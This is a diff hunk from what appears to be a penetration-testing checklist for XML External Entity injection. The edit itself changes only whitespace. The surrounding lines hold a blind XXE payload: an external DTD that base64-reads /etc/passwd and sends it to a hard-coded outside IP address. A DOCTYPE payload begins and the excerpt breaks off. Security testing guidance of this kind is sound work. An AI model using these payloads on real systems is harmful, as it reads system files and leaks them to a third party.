@@ -18,16 +18,16 @@ Use this checklist when testing for XML External Entity (XXE) injection vulnerab
 ### Blind XXE Testing
 
 - [ ] Test for out-of-band XXE using external DTD references to your controlled server
-    
+
 Host dtd.xml
-    
+
 ```xml
 <!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=file:///etc/passwd">
 <!ENTITY % param1 "<!ENTITY exfil SYSTEM 'http://129.212.189.27/dtd.xml?%data;'>">
 ```
-    
+
 Now use the following:
-    
+
 ```xml
 <!DOCTYPE r [
 <!ELEMENT r ANY >
